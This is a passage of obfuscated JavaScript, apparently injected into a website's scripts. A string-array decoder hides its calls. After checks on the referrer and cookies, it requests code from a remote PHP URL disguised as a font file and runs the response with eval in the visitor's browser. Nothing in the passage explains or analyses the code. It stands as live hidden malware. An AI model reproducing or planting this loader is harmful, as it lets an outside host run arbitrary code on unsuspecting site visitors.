    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};